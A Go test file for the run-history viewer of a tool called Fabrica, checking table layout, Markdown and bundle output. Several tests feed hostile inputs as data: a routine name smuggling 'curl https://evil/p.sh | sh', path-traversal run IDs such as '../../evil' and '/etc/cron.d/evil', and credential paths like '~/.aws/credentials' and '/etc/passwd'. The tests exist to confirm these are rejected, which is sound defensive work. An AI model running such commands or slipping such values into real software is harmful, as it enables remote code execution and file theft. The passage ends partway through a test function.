package runview

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"slices"
	"strconv"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/staltz/fabrica/internal/runs"
)

var (
	zone = time.FixedZone("TEST", 3*60*60)
	now  = time.Date(2026, 10, 17, 7, 4, 0, 0, time.UTC) // 10:04 in zone
)

func testView() View { return View{Now: now, Loc: zone} }

func at(day, clock string) time.Time {
	t, err := time.Parse(time.RFC3339, "2026-10-"+day+"T"+clock+"Z")
	if err != nil {
		panic(err)
	}
	return t
}

func TestClean(t *testing.T) {
	for in, want := range map[string]string{
		"plain":                          "plain",
		"  two   spaces\tand\ttabs ":     "two spaces and tabs",
		"line one\nline two\r\n":         "line one line two",
		"\x1b[2Jscreen\x1b]0;title\a":    "[2Jscreen ]0;title",
		"nul\x00byte, del\x7f, c1\u009b": "nul byte, del , c1",
		"emoji 🙂 and ü":                  "emoji 🙂 and ü",
		"\u2028line separator":           "line separator",
		"":                               "",
	} {
		if got := clean(in); got != want {
			t.Errorf("clean(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestCut(t *testing.T) {
	for _, c := range []struct {
		in   string
		n    int
		want string
	}{
		{"short", 10, "short"}, {"exactly ten", 11, "exactly ten"}, {"a bit too long", 8, "a bit t…"}, {"ünïcödé text", 6, "ünïcö…"}, {"x", 0, ""}, {"xy", 1, "…"},
	} {
		if got := cut(c.in, c.n); got != c.want {
			t.Errorf("cut(%q, %d) = %q, want %q", c.in, c.n, got, c.want)
		}
	}
}

func TestElapsed(t *testing.T) {
	for d, want := range map[time.Duration]string{
		0: "0s", 40 * time.Second: "40s", time.Minute: "1m", 17*time.Minute + 38*time.Second: "17m", 59*time.Minute + 59*time.Second: "59m",
		time.Hour: "1h", 2*time.Hour + 5*time.Minute: "2h 5m", 23*time.Hour + 59*time.Minute: "23h 59m", 24 * time.Hour: "1d", 27 * time.Hour: "1d 3h", 10*24*time.Hour + time.Hour: "10d 1h",
	} {
		if got := elapsed(d); got != want {
			t.Errorf("elapsed(%v) = %q, want %q", d, got, want)
		}
	}
}

func TestUniquePrefixes(t *testing.T) {
	ids := []string{
		"run_06gmjeps8jf8zfjjrfmydev50g",
		"run_06gmjeps8k00000000000000aa", // shares 11 characters with the one above
		"run_06gmjeps8k00000000000000ab", // and 28 with this one
		"run_06gmh2aa000000000000000000",
		"run_01",
	}
	// At least 12 characters, and as many as it takes. The last ID is
	// shorter than 12, and stays whole.
	got := UniquePrefixes(ids, 12)
	if want := []string{"run_06gmjeps8j", "run_06gmjeps8k00000000000000aa", "run_06gmjeps8k00000000000000ab", "run_06gmh2aa", "run_01"}; !slices.Equal(got, want) {
		t.Errorf("UniquePrefixes = %q, want %q", got, want)
	}
	// Every prefix fits exactly one ID.
	for i, p := range got {
		n := 0
		for _, id := range ids {
			if strings.HasPrefix(id, p) {
				n++
			}
		}
		if n != 1 {
			t.Errorf("prefix %q of %q fits %d IDs", p, ids[i], n)
		}
	}
	if got := UniquePrefixes(nil, 12); len(got) != 0 {
		t.Errorf("no IDs = %q", got)
	}
	// The order of the IDs doesn't matter.
	shuffled := []string{ids[2], ids[0], ids[3], ids[1], ids[4]}
	for i, p := range UniquePrefixes(shuffled, 12) {
		if want := got[slices.Index(ids, shuffled[i])]; p != want {
			t.Errorf("%q gets prefix %q when shuffled, %q in order", shuffled[i], p, want)
		}
	}
}

func summary(id, factory, routine, repo, intent, outcome string) runs.Summary {
	return runs.Summary{RunID: id, StartedAt: at("17", "07:41:02"), Factory: factory, Routine: routine, Repo: repo, Intent: intent, Outcome: outcome, PRLinks: []string{}}
}

func TestListFitsTheWidth(t *testing.T) {
	long := strings.Repeat("very long text ", 20)
	for name, list := range map[string][]runs.Summary{
		"typical": {
			summary("run_06gmjeps8jf8zfjjrfmydev50g", "acme", "pr-review", "github.com/acme/app", "Review PR 412 for the billing retry change", "succeeded"),
			summary("run_06gmj9xq8jf8zfjjrfmydev50g", "acme", "", "github.com/acme/app", "Fix flaky checkout test", "stale"),
		},
		"two factories": {
			summary("run_06gmjeps8jf8zfjjrfmydev50g", "acme", "pr-review", "github.com/acme/app", "Review PR 412 for the billing retry change", "in_progress"),
			summary("run_06gmj9xq8jf8zfjjrfmydev50g", "personal", "", "github.com/me/notes", "Fix flaky checkout test", "stale"),
		},
		"long everything": {
			summary("run_06gmjeps8jf8zfjjrfmydev50g", long, long, "github.com/"+long, long, "in_progress"),
			summary("run_06gmj9xq8jf8zfjjrfmydev50g", "other"+long, "x", "gitlab.com/a/b/c/"+long, long, "succeeded"),
		},
		"nothing but an ID": {summary("run_06gmjeps8jf8zfjjrfmydev50g", "", "", "", "", "failed")},
		"close IDs": {
			summary("run_06gmjeps8jf8zfjjrfmydev50g", "acme", "a", "github.com/acme/app", "x", "failed"),
			summary("run_06gmjeps8jf8zfjjrfmydev50h", "acme", "b", "github.com/acme/app", "y", "failed"),
		},
		"wide characters": {summary("run_06gmjeps8jf8zfjjrfmydev50g", "acme", "pr-review", "github.com/acme/app", strings.Repeat("ünïcödé ", 30), "failed")},
	} {
		var out bytes.Buffer
		testView().List(&out, list, false, 80)
		for _, line := range strings.Split(out.String(), "\n") {
			if n := utf8.RuneCountInString(line); n > 80 {
				t.Errorf("%s: a line is %d characters wide:\n%s", name, n, line)
			}
			if strings.HasSuffix(line, " ") {
				t.Errorf("%s: a line ends in a space: %q", name, line)
			}
		}
		// Every run is there, with the start of its ID that tells it apart.
		prefixes := UniquePrefixes(idsOf(list), MinRunPrefix)
		for _, p := range prefixes {
			if !strings.Contains(out.String(), p) {
				t.Errorf("%s: the table should show %s:\n%s", name, p, out.String())
			}
		}
	}

	// A wider terminal gets whole intents.
	var out bytes.Buffer
	testView().List(&out, []runs.Summary{summary("run_06gmjeps8jf8zfjjrfmydev50g", "acme", "pr-review", "github.com/acme/app", "Review PR 412 for the billing retry change", "succeeded")}, false, 120)
	if !strings.Contains(out.String(), "Review PR 412 for the billing retry change  run_06gmjeps") {
		t.Errorf("a wide table:\n%s", out.String())
	}
}

func TestListShape(t *testing.T) {
	list := []runs.Summary{
		summary("run_06gmjeps8jf8zfjjrfmydev50g", "acme", "pr-review", "github.com/acme/app", "Review PR 412", "succeeded"),
		summary("run_06gmj9xq8jf8zfjjrfmydev50g", "acme", "", "", "Fix a test", "stale"),
	}
	list[1].StartedAt = at("12", "20:30:00") // the next day's early morning, in the zone: Oct 12 23:30
	var out bytes.Buffer
	testView().List(&out, list, true, 80)
	want := `STARTED       OUTCOME    ROUTINE    REPO      INTENT         RUN
Oct 17 10:41  succeeded  pr-review  acme/app  Review PR 412  run_06gmjeps
Oct 12 23:30  stale      —                    Fix a test     run_06gmj9xq

2 runs from factory acme. Show one with: fabrica runs show <run>
There are more: raise --limit, or narrow things down with --since and filters.
`
	if out.String() != want {
		t.Errorf("table:\n%s\nwant:\n%s", out.String(), want)
	}

	// Several factories get a column; a lone run is "1 run".
	out.Reset()
	list[1].Factory = "personal"
	testView().List(&out, list[:1], false, 80)
	if !strings.Contains(out.String(), "\n1 run from factory acme. Show") {
		t.Errorf("one run:\n%s", out.String())
	}
	out.Reset()
	testView().List(&out, list, false, 80)
	if !strings.Contains(out.String(), "FACTORY") || !strings.HasSuffix(out.String(), "\n2 runs. Show one with: fabrica runs show <run>\n") {
		t.Errorf("two factories:\n%s", out.String())
	}
}

func detail(timeline ...runs.Event) *runs.Detail {
	return &runs.Detail{
		Summary: runs.Summary{RunID: "run_x", StartedAt: at("17", "07:41:02"), LastAt: at("17", "07:58:40"), Outcome: "succeeded", Intent: "Do a thing", Routine: "pr-review",
			Runtime: "claude-code-cloud", Repo: "github.com/acme/app", Factory: "acme", BlueprintSHA: "ee8f1420a5b6c7d8e9f00112233445566778899a", ServedBy: runs.ServedRemote,
			CheckpointCount: 1, PRLinks: []string{}},
		Timeline: timeline,
	}
}

func load(clock, kind, name string) runs.Event {
	return runs.Event{At: at("17", clock), Type: runs.EventLoad, Kind: kind, Name: name}
}

func TestShowMergesLoadsOfTheSameKind(t *testing.T) {
	d := detail(
		load("07:41:05", "routine", "pr-review"),
		load("07:41:06", "rule", "a"), load("07:41:06", "rule", "b"), load("07:41:07", "rule", "a"),
		load("07:41:09", "skill", "pr-review"),
		runs.Event{At: at("17", "07:47:30"), Type: runs.EventCheckpoint, Author: runs.ByAgent, Status: "progress", Summary: "Read the diff", Links: []string{}},
		load("07:48:00", "skill", "pr-review"), // after something else: a line of its own
		load("07:48:01", "rule", "c"),
	)
	got := testView().Show(d)
	for _, want := range []string{
		"\n10:41:05  loaded routine pr-review\n",
		"\n10:41:06  loaded rules a (×2), b\n",
		"\n10:41:09  loaded skill pr-review\n",
		"\n10:47:30  progress   Read the diff\n",
		"\n10:48:00  loaded skill pr-review\n",
		"\n10:48:01  loaded rule c\n",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("show is missing %q:\n%s", want, got)
		}
	}
	if strings.Count(got, "loaded") != 5 {
		t.Errorf("five lines of loads:\n%s", got)
	}
}

func TestShowACrossingOfMidnightAndOfNewYear(t *testing.T) {
	d := detail(
		runs.Event{At: at("17", "20:30:00"), Type: runs.EventCheckpoint, Author: runs.ByAgent, Status: "progress", Summary: "Still going", Links: []string{}},
		runs.Event{At: at("18", "02:00:00"), Type: runs.EventCheckpoint, Author: runs.ByAgent, Status: "succeeded", Summary: "Done", Links: []string{"https://github.com/acme/app/pull/1"}},
	)
	d.StartedAt, d.LastAt = at("17", "07:41:02"), at("18", "02:00:00")
	got := testView().Show(d)
	for _, want := range []string{
		"Started    Oct 17 10:41:02, last heard from Oct 18 05:00:00 (18h 18m later)\n",
		"\n23:30:00  progress   Still going\nOct 18\n05:00:00  succeeded  Done\n          → https://github.com/acme/app/pull/1\n",
	} {
		if !strings.Contains(got, want) {
			t.Errorf("show is missing %q:\n%s", want, got)
		}
	}

	// A run from last year says so.
	late := View{Now: time.Date(2027, 1, 5, 12, 0, 0, 0, time.UTC), Loc: zone}
	if got := late.Show(d); !strings.Contains(got, "Started    Oct 17 2026 10:41:02, last heard from Oct 18 2026 05:00:00") {
		t.Errorf("a run from last year:\n%s", got)
	}
	// And the Markdown always has the whole date.
	md := late.Markdown(d)
	if !strings.Contains(md, "**Started:** 2026-10-17 10:41:02, last heard from 2026-10-18 05:00:00 (18h 18m later)") || !strings.Contains(md, "- **2026-10-18**\n") {
		t.Errorf("Markdown:\n%s", md)
	}
}

func TestShowWithLittleToShow(t *testing.T) {
	d := detail()
	d.CheckpointCount, d.LastAt, d.Routine, d.Runtime, d.Repo, d.Factory, d.BlueprintSHA, d.ServedBy = 0, d.StartedAt, "", "", "", "", "", ""
	want := `Run run_x: succeeded
  Intent     Do a thing
  Factory    no factory
  Routine    none (interactive)
  Started    Oct 17 10:41:02, never reported

No loads or checkpoints were recorded.
`
	if got := testView().Show(d); got != want {
		t.Errorf("show:\n%s\nwant:\n%s", got, want)
	}
	md := testView().Markdown(d)
	if !strings.Contains(md, "## Timeline\n\nNo loads or checkpoints were recorded.\n") || strings.Contains(md, "Instructions this run was served") {
		t.Errorf("Markdown:\n%s", md)
	}
}

func TestShowLabelsFabricasOwnCheckpoints(t *testing.T) {
	d := detail(runs.Event{At: at("17", "07:41:02"), Type: runs.EventCheckpoint, Author: runs.ByFabrica, Status: "failed", Summary: "Refused: stub is outdated", Links: []string{}})
	if got := testView().Show(d); !strings.Contains(got, "\n10:41:02  fabrica    failed: Refused: stub is outdated\n") {
		t.Errorf("show:\n%s", got)
	}
	if got := testView().Markdown(d); !strings.Contains(got, "- 10:41:02 **fabrica**: failed: Refused: stub is outdated\n") {
		t.Errorf("Markdown:\n%s", got)
	}
}

func TestBlueprintPaths(t *testing.T) {
	d := detail()
	v := testView()
	v.BlueprintPath = func(factory string) (string, bool) {
		return map[string]string{"acme": "teams/platform", "root": ""}[factory], factory == "acme" || factory == "root"
	}
	if got := v.Show(d); !strings.Contains(got, "show ee8f142:teams/platform/routines/pr-review.md\n") || strings.Contains(got, "subfolder") {
		t.Errorf("a blueprint in a subfolder:\n%s", got)
	}
	d.Factory = "root"
	if got := v.Show(d); !strings.Contains(got, "show ee8f142:routines/pr-review.md\n") || strings.Contains(got, "subfolder") {
		t.Errorf("a blueprint at the root of its repo:\n%s", got)
	}
	d.Factory = "elsewhere"
	if got := v.Show(d); !strings.Contains(got, "show ee8f142:routines/pr-review.md\n") || !strings.Contains(got, "subfolder") {
		t.Errorf("an unknown factory:\n%s", got)
	}
	d.BlueprintSHA = ""
	if got := v.Show(d); strings.Contains(got, "git ") {
		t.Errorf("a run with no blueprint commit has nothing to point at:\n%s", got)
	}
}

// Agents choose the routine name that run_begin records, even when Fabrica
// refuses the run, so it can be anything. Only a name that is one may end up
// in a command someone will paste into a shell.
func TestNoGitCommandForANameThatIsntOne(t *testing.T) {
	evil := "x.md; curl https://evil/p.sh | sh #"
	v := testView()
	v.BlueprintPath = func(string) (string, bool) { return "", true }

	d := detail()
	d.Routine = evil
	interactive := detail(load("07:41:06", "rule", "a; curl https://evil/p.sh | sh #"), load("07:41:07", "skill", "../../etc/passwd"),
		load("07:41:08", "skill", "pr-review"), load("07:41:09", "rule", "commit-messages"))
	interactive.Routine = ""

	for name, got := range map[string]string{
		"show": v.Show(d), "Markdown": v.Markdown(d),
		"show, interactive": v.Show(interactive), "Markdown, interactive": v.Markdown(interactive),
	} {
		for _, bad := range []string{"curl ", "etc/passwd", "x.md"} {
			for _, line := range strings.Split(got, "\n") {
				if strings.Contains(line, "git ") && strings.Contains(line, bad) {
					t.Errorf("%s has a command with %q in it: %s", name, bad, line)
				}
			}
		}
	}
	// The name is still shown, as plain text, to diagnose the refusal.
	if got := v.Show(d); !strings.Contains(got, evil) || strings.Contains(got, "git ") || strings.Contains(got, "instructions this run was served") {
		t.Errorf("a run with a bad routine name:\n%s", got)
	}
	// The valid names of an interactive run still get their commands.
	got := v.Show(interactive)
	for _, want := range []string{"show ee8f142:skills/pr-review/SKILL.md\n", "show ee8f142:rules/commit-messages.mdc\n"} {
		if !strings.Contains(got, want) {
			t.Errorf("show is missing %q:\n%s", want, got)
		}
	}
	if n := strings.Count(got, "git -C"); n != 2 {
		t.Errorf("%d commands, want 2 (one per valid name):\n%s", n, got)
	}

	// The bundle's README gathers the commands of every run.
	dir := filepath.Join(t.TempDir(), "bundle")
	if err := v.WriteBundle(dir, Bundle{Runs: []*runs.Detail{d}}); err != nil {
		t.Fatal(err)
	}
	readme, err := os.ReadFile(filepath.Join(dir, "README.md"))
	if err != nil {
		t.Fatal(err)
	}
	if strings.Contains(string(readme), "git -C") {
		t.Errorf("the README has a command for a bad name:\n%s", readme)
	}
}

// A blueprint folder can have spaces or quotes in its name, so the path
// goes in the command quoted.
func TestGitCommandQuotesThePath(t *testing.T) {
	d := detail()
	v := testView()
	v.BlueprintPath = func(string) (string, bool) { return "my team/it's $HOME", true }
	want := `show 'ee8f142:my team/it'\''s $HOME/routines/pr-review.md'` + "\n"
	if got := v.Show(d); !strings.Contains(got, want) {
		t.Errorf("show is missing %q:\n%s", want, got)
	}
}

func TestCounts(t *testing.T) {
	var list []*runs.Detail
	for _, o := range []string{"failed", "succeeded", "stale", "succeeded", "in_progress", "succeeded"} {
		list = append(list, &runs.Detail{Summary: runs.Summary{Outcome: o}})
	}
	if got := Counts(list); got != "3 succeeded, 1 failed, 1 stale, 1 in progress" {
		t.Errorf("Counts = %q", got)
	}
	if got := Counts(list[:1]); got != "1 failed" {
		t.Errorf("Counts = %q", got)
	}
}

func TestCheckDir(t *testing.T) {
	dir := t.TempDir()
	if err := CheckDir(dir); err != nil {
		t.Errorf("an empty folder is fine: %v", err)
	}
	if err := CheckDir(filepath.Join(dir, "not", "there", "yet")); err != nil {
		t.Errorf("a folder that isn't there is fine: %v", err)
	}
	file := filepath.Join(dir, "a-file")
	if err := os.WriteFile(file, nil, 0o644); err != nil {
		t.Fatal(err)
	}
	if err := CheckDir(dir); err == nil || !strings.Contains(err.Error(), dir+" already has files in it") {
		t.Errorf("a folder with a file: %v", err)
	}
	if err := CheckDir(file); err == nil {
		t.Error("a file is no folder")
	}
	if err := testView().WriteBundle(dir, Bundle{}); err == nil {
		t.Error("WriteBundle checks the folder too")
	}
}

func TestSuccessRate(t *testing.T) {
	for _, c := range []struct {
		succeeded, failed, stale int
		want                     string
	}{
		{17, 4, 2, "81%"}, {1, 2, 0, "33%"}, {2, 1, 0, "67%"}, {0, 3, 0, "0%"}, {5, 0, 9, "100%"}, {0, 0, 4, "—"}, {0, 0, 0, "—"},
	} {
		r := routineTotals{byOutcome: map[string]int{runs.OutcomeSucceeded: c.succeeded, runs.OutcomeFailed: c.failed, runs.OutcomeStale: c.stale}}
		got := "—"
		if p, ok := r.successRate(); ok {
			got = strconv.Itoa(p) + "%"
		}
		if got != c.want {
			t.Errorf("%d succeeded, %d failed, %d stale: %s, want %s", c.succeeded, c.failed, c.stale, got, c.want)
		}
	}
}

func TestBundle(t *testing.T) {
	review := detail(
		load("07:41:05", "routine", "pr-review"), load("07:41:06", "rule", "commit-messages"), load("07:41:09", "skill", "pr-review"),
		runs.Event{At: at("17", "07:58:40"), Type: runs.EventCheckpoint, Author: runs.ByAgent, Status: "succeeded", Summary: "Posted review", Links: []string{"https://github.com/acme/app/pull/412"}},
		runs.Event{At: at("17", "07:58:40"), Type: runs.EventFriction, Kind: "navigation", Note: "couldn't find the config"},
	)
	review.RunID, review.PRLinks, review.FrictionCount = "run_a", []string{"https://github.com/acme/app/pull/412"}, 1
	refused := detail(runs.Event{At: at("16", "18:00:00"), Type: runs.EventCheckpoint, Author: runs.ByFabrica, Status: "failed", Summary: "Refused: stub is outdated", Links: []string{}})
	refused.RunID, refused.Outcome, refused.StartedAt, refused.BlueprintSHA = "run_b", "failed", at("16", "18:00:00"), ""
	refused.Session, refused.LastSummary = "/definitely/not/a/file/here.jsonl", "Refused: stub is outdated"
	// A transcript is a .jsonl file in the home folder.
	home := t.TempDir()
	t.Setenv("HOME", home)
	transcript := filepath.Join(home, "t.jsonl")
	if err := os.WriteFile(transcript, nil, 0o644); err != nil {
		t.Fatal(err)
	}
	stale := detail()
	stale.RunID, stale.Outcome, stale.Routine, stale.Session = "run_c", "stale", "", transcript
	other := detail()
	other.RunID, other.Session = "run_d", "https://claude.ai/code/session_1"

	dir := filepath.Join(t.TempDir(), "bundle")
	b := Bundle{Server: "https://fabrica.acme.dev", Filter: runs.Filter{Routine: "pr-review", Outcomes: []string{"failed", "stale"}, Since: at("03", "07:04:00"), Limit: 200}, Runs: []*runs.Detail{review, refused, stale, other}}
	if err := testView().WriteBundle(dir, b); err != nil {
		t.Fatal(err)
	}
	read := func(name string) string {
		data, err := os.ReadFile(filepath.Join(dir, filepath.FromSlash(name)))
		if err != nil {
			t.Fatal(err)
		}
		return string(data)
	}

	// The layout.
	for _, id := range []string{"run_a", "run_b", "run_c", "run_d"} {
		if md := read("runs/" + id + ".md"); !strings.HasPrefix(md, "# Run "+id+": ") {
			t.Errorf("runs/%s.md:\n%s", id, md)
		}
	}
	entries, _ := os.ReadDir(filepath.Join(dir, "runs"))
	if len(entries) != 4 {
		t.Errorf("a file per run: %d", len(entries))
	}

	// runs.json is {schema_version, filters, runs}.
	var parsed map[string]json.RawMessage
	if err := json.Unmarshal([]byte(read("runs.json")), &parsed); err != nil {
		t.Fatal(err)
	}
	keys := []string{}
	for k := range parsed {
		keys = append(keys, k)
	}
	slices.Sort(keys)
	if !slices.Equal(keys, []string{"filters", "runs", "schema_version"}) || string(parsed["schema_version"]) != "3" {
		t.Errorf("runs.json has %v, schema_version %s", keys, parsed["schema_version"])
	}
	var filters map[string]any
	_ = json.Unmarshal(parsed["filters"], &filters)
	if filters["routine"] != "pr-review" || filters["since"] != "2026-10-03T07:04:00Z" || filters["limit"] != 200.0 || len(filters["outcomes"].([]any)) != 2 || filters["factory"] != nil {
		t.Errorf("filters = %v", filters)
	}
	var back []runs.Detail
	if err := json.Unmarshal(parsed["runs"], &back); err != nil || len(back) != 4 || back[0].RunID != "run_a" || len(back[0].Timeline) != 5 {
		t.Errorf("runs = %v, %v", back, err)
	}
	// With no runs at all, it's still a list.
	empty := filepath.Join(t.TempDir(), "empty")
	if err := testView().WriteBundle(empty, Bundle{}); err != nil {
		t.Fatal(err)
	}
	if data, _ := os.ReadFile(filepath.Join(empty, "runs.json")); !strings.Contains(string(data), `"runs": []`) {
		t.Errorf("no runs:\n%s", data)
	}

	readme := read("README.md")
	// The sections come in the order the spec gives.
	var at []int
	for _, heading := range []string{"# Fabrica run history", "## Totals", "### Runs by outcome", "### Runs by routine", "### Friction notes", "### Most-loaded skills and rules", "### Refusals",
		"## Runs", "### failed (1)", "### stale (1)", "### succeeded (2)", "## Where to look next", "### Instructions the runs were served", "### Pull requests", "### Transcripts", "## Fields you can't fully trust"} {
		i := strings.Index(readme, "\n"+heading+"\n")
		if heading == "# Fabrica run history" {
			i = strings.Index("\n"+readme, "\n"+heading+"\n")
		}
		if i < 0 {
			t.Errorf("README has no %q:\n%s", heading, readme)
		}
		at = append(at, i)
	}
	if !slices.IsSorted(at) {
		t.Errorf("README sections are out of order: %v", at)
	}
	for _, want := range []string{
		"read from the Fabrica server at https://fabrica.acme.dev, the ones that started since 2026-10-03 10:04 and match routine pr-review, outcome failed or stale, newest first.",
		"- failed: 1\n- stale: 1\n- succeeded: 2\n",
		"| pr-review | 3 | 2 | 1 | 0 | 0 | 67% |",
		"| (interactive) | 1 | 0 | 0 | 1 | 0 | — |",
		"- navigation: 1\n",
		"| skill | pr-review | 1 |",
		"| rule | commit-messages | 1 |",
		"- Refused: stub is outdated: 1\n",
		"- [run_b](runs/run_b.md) 2026-10-16 21:00, pr-review on acme/app: Do a thing\n  - Last report: Refused: stub is outdated\n",
		"- `ee8f142` (factory acme, 3 runs)\n  - `git -C <your blueprint clone> show ee8f142:routines/pr-review.md`\n",
		"- https://github.com/acme/app/pull/412 (run_a, succeeded)\n",
		"- " + transcript + " (run_c, stale)\n",
	} {
		if !strings.Contains(readme, want) {
			t.Errorf("README is missing %q:\n%s", want, readme)
		}
	}
	// A URL isn't listed, and a path that isn't a transcript on this machine
	// is only an unverified pointer (TestBundleSaysWhichTranscriptsItChecked
	// has the details).
	if strings.Contains(readme, "claude.ai/code/session_1") {
		t.Errorf("README shouldn't list a session URL:\n%s", readme)
	}
	if _, listed, _ := strings.Cut(readme, "an unverified pointer"); !strings.Contains(listed, "- /definitely/not/a/file/here.jsonl (run_b, failed)\n") {
		t.Errorf("README should list the path that isn't a transcript as unverified:\n%s", readme)
	}
	// A bundle from this machine says where it read from, and one that has
	// more than it holds says so.
	b.Server, b.LocalPath, b.More = "", "/home/me/.fabrica/runs.db", true
	if text := testView().intro(b); !strings.Contains(text, "read from this machine's run history (/home/me/.fabrica/runs.db)") || !strings.Contains(text, "this is the newest 4 of them.") {
		t.Errorf("intro = %s", text)
	}
}

// A bundle names the file of each run after its ID, and with --server the
// IDs come from a server that may not be the one it should be. An ID that
// isn't one Fabrica makes could write a file anywhere.
func TestBundleRefusesIDsThatArentRunIDs(t *testing.T) {
	good := detail()
	good.RunID = runs.NewID(now)
	for _, id := range []string{
		"../../evil", "run_../../evil", "run_a/../../evil", "/etc/cron.d/evil", `run_a\..\evil`, "run_a.md", "run_", "", "RUN_A", "run_A", "run_a b", "run_a\x00b", "run_\u00e9", "x_run_a",
		"run_a\n", "..", ".", "run_a/b",
	} {
		bad := detail()
		bad.RunID = id
		parent := t.TempDir()
		dir := filepath.Join(parent, "bundle")
		err := testView().WriteBundle(dir, Bundle{Server: "https://fabrica.acme.dev", Runs: []*runs.Detail{good, bad}})
		if err == nil || !strings.Contains(err.Error(), "isn't a run ID") {
			t.Errorf("run ID %q: WriteBundle = %v, want a refusal that says it isn't a run ID", id, err)
		}
		// Nothing is written, in the bundle or beside it.
		if left, _ := os.ReadDir(parent); len(left) != 0 {
			t.Errorf("run ID %q left %v behind", id, left)
		}
	}
	// The IDs Fabrica makes, and the test ones in this package, are fine.
	dir := filepath.Join(t.TempDir(), "bundle")
	other := detail()
	other.RunID = "run_01m4qb8knr0000000000000002"
	if err := testView().WriteBundle(dir, Bundle{Runs: []*runs.Detail{good, other}}); err != nil {
		t.Errorf("WriteBundle = %v", err)
	}
}

func TestLocalFile(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	outside := t.TempDir() // not in the home folder
	write := func(path string) string {
		t.Helper()
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte("{}\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		return path
	}
	link := func(target, name string) string {
		t.Helper()
		if err := os.Symlink(target, name); err != nil {
			t.Skipf("can't make symbolic links here: %v", err)
		}
		return name
	}
	transcript := write(filepath.Join(home, ".claude", "projects", "app", "abc.jsonl"))
	mine := write(filepath.Join(home, "mine.jsonl"))
	creds := write(filepath.Join(home, ".aws", "credentials"))
	notes := write(filepath.Join(home, "notes.txt"))
	away := write(filepath.Join(outside, "t.jsonl"))
	if err := os.Mkdir(filepath.Join(home, "folder.jsonl"), 0o755); err != nil {
		t.Fatal(err)
	}
	// A link in the home folder, to a transcript in it, to one outside, and a
	// folder that leads outside.
	linkToMine := link(mine, filepath.Join(home, "link.jsonl"))
	linkAway := link(away, filepath.Join(home, "away.jsonl"))
	linkedFolder := link(outside, filepath.Join(home, "out"))

	for in, want := range map[string]string{
		transcript:                         transcript,
		" " + transcript + "\n":            transcript,
		mine:                               mine,
		"~/mine.jsonl":                     mine,
		"~/.claude/projects/app/abc.jsonl": transcript,
		home + "/./.claude/projects/../../mine.jsonl": mine,
		// Anything else on this machine isn't a transcript, whatever the
		// agent says it is.
		"/etc/passwd":                          "",
		creds:                                  "", // not a .jsonl file
		"~/.aws/credentials":                   "",
		notes:                                  "",
		away:                                   "", // outside the home folder
		filepath.Join(home, "folder.jsonl"):    "", // a folder
		filepath.Join(home, "gone.jsonl"):      "",
		linkToMine:                             "", // a link, even to a file in the home folder
		linkAway:                               "",
		filepath.Join(linkedFolder, "t.jsonl"): "", // a folder that is a link to outside
		home + "/../" + filepath.Base(outside) + "/t.jsonl": "",
		"~/../" + filepath.Base(outside) + "/t.jsonl":       "",
		home:                                "",
		"t.jsonl":                           "", // not absolute
		"copilot-local:3f2a9c":              "",
		"https://claude.ai/code/session_01": "",
		"file://" + mine:                    "",
		"":                                  "",
		"~/gone.jsonl":                      "",
		"~":                                 "",
	} {
		got, ok := localFile(in)
		if got != want || ok != (want != "") {
			t.Errorf("localFile(%q) = %q, %v; want %q", in, got, ok, want)
		}
	}
}

// What the README says about a run's session pointer depends on whether it
// is a transcript. Only a regular .jsonl file in the home folder is. A path
// is something an agent chooses, so any other path is only what it said.
func TestBundleSaysWhichTranscriptsItChecked(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	transcript := filepath.Join(home, "t.jsonl")
	secret := filepath.Join(home, "credentials")
	elsewhere := filepath.Join(t.TempDir(), "t.jsonl")
	for _, f := range []string{transcript, secret, elsewhere} {
		if err := os.WriteFile(f, nil, 0o644); err != nil {
			t.Fatal(err)
		}
	}
	mk := func(id, outcome, session string) *runs.Detail {
		d := detail()
		d.RunID, d.Outcome, d.Session = id, outcome, session
		return d
	}
	list := []*runs.Detail{
		mk("run_a", "succeeded", transcript), mk("run_b", "failed", secret), mk("run_c", "stale", elsewhere),
		mk("run_d", "succeeded", "/etc/passwd"), mk("run_e", "succeeded", "https://claude.ai/code/session_1"), mk("run_f", "succeeded", ""),
	}
	dir := filepath.Join(t.TempDir(), "bundle")
	if err := testView().WriteBundle(dir, Bundle{Runs: list}); err != nil {
		t.Fatal(err)
	}
	data, err := os.ReadFile(filepath.Join(dir, "README.md"))
	if err != nil {
		t.Fatal(err)
	}
	readme := string(data)
	_, section, _ := strings.Cut(readme, "### Transcripts\n")
	section, _, _ = strings.Cut(section, "\n## ")
	checked, unchecked, split := strings.Cut(section, "report a file path")
	if !split {
		t.Fatalf("the Transcripts section has no part for the unverified paths:\n%s", section)
	}
	if !strings.Contains(checked, "- "+transcript+" (run_a, succeeded)\n") || !strings.Contains(checked, "a file on this machine") {
		t.Errorf("the transcript that is one isn't listed as a file on this machine:\n%s", section)
	}
	for _, id := range []string{"run_b", "run_c", "run_d", "run_e", "run_f"} {
		if strings.Contains(checked, id) {
			t.Errorf("%s is listed as a file on this machine:\n%s", id, section)
		}
	}
	// The others are only what the agents said, in a part that says so.
	for _, want := range []string{
		"- " + secret + " (run_b, failed)\n", "- " + elsewhere + " (run_c, stale)\n", "- /etc/passwd (run_d, succeeded)\n",
		"The agent wrote", "unverified", "isn't a regular `.jsonl` file under your home folder",
	} {
		if !strings.Contains(unchecked, want) {
			t.Errorf("the unverified part is missing %q:\n%s", want, section)
		}
	}
	for _, id := range []string{"run_a", "run_e", "run_f"} {
		if strings.Contains(unchecked, id) {
			t.Errorf("%s is listed as an unverified path:\n%s", id, section)
		}
	}

	// With no transcript at all, nothing claims there's a file on this machine.
	dir = filepath.Join(t.TempDir(), "bundle")
	if err := testView().WriteBundle(dir, Bundle{Runs: list[1:]}); err != nil {
		t.Fatal(err)
	}
	data, _ = os.ReadFile(filepath.Join(dir, "README.md"))
	if strings.Contains(string(data), "is a file on this machine") || !strings.Contains(string(data), "No run points at a transcript file on this machine.") {
		t.Errorf("the README with no transcripts:\n%s", data)
	}
}

func TestTotals(t *testing.T) {
	var list []*runs.Detail
	add := func(factory, routine, outcome string, events ...runs.Event) {
		d := detail(events...)
		d.RunID, d.Factory, d.Routine, d.Outcome = "run_"+string(rune('a'+len(list))), factory, routine, outcome
		list = append(list, d)
	}
